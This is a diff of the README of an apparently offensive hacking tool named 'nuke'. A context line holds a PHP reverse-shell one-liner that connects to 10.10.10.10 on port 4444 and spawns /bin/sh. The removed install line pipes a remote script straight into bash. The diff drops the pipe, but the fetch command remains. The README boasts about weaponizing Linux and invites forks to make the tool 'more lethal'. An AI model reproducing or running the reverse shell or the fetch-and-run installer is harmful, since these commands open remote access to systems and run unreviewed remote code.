@@ -47,8 +47,8 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 <h1> 
    <b> Installation in 20 seconds ( One Command ) </b>
-  ``` 
-  curl -sSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh | bash
+  ```
+  curl -sSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh
   ```
 </h1>
 
@@ -63,7 +63,7 @@ nuke
  ```
 I don't tech Linux. I weaponize it. --wtf.mr
 ```
-<br> <br>
+<br> 
 <b> Star this repo if you belive tool should be dangerous. <b>
 <b> Fork it if you want to make it even more lethal. <b>
  
